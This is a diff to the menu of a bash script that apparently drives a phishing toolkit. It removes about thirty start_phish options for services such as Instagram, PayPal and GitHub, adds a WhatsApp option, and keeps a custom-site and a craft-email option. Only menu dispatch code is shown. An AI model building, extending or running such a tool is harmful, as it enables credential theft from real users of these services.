@@ -496,38 +496,7 @@ menu() {
         read -p " ${C}[*] SELECT: ${N}" choice
 
         case $choice in
-            01|1)  start_phish "instagram" ;;
-            02|2)  start_phish "facebook" ;;
-            03|3)  start_phish "google" ;;
-            04|4)  start_phish "microsoft" ;;
-            05|5)  start_phish "netflix" ;;
-            06|6)  start_phish "paypal" ;;
-            07|7)  start_phish "steam" ;;
-            08|8)  start_phish "twitter" ;;
-            09|9)  start_phish "spotify" ;;
-            10)    start_phish "adobe" ;;
-            11)    start_phish "badoo" ;;
-            12)    start_phish "cryptocurrency" ;;
-            13)    start_phish "devianart" ;;
-            14)    start_phish "dropbox" ;;
-            15)    start_phish "github" ;;
-            16)    start_phish "gitlab" ;;
-            17)    start_phish "linkedin" ;;
-            18)    start_phish "messenger" ;;
-            19)    start_phish "myspace" ;;
-            20)    start_phish "origin" ;;
-            21)    start_phish "pinterest" ;;
-            22)    start_phish "protonmail" ;;
-            23)    start_phish "shopify" ;;
-            24)    start_phish "snapchat" ;;
-            25)    start_phish "shopping" ;;
-            26)    start_phish "twitch" ;;
-            27)    start_phish "verizon" ;;
-            28)    start_phish "vk" ;;
-            29)    start_phish "wordpress" ;;
-            30)    start_phish "yahoo" ;;
-            31)    start_phish "yandex" ;;
-            32)    start_phish "instafollowers" ;;
+            01|1)  start_phish "whatsapp" ;;
             33)    read -p " ${C}[?] Site folder name: ${N}" custom_site; start_phish "$custom_site" ;;
             [eE])  craft_email ;;
             [qQ])  summary; stop; exit 0 ;;
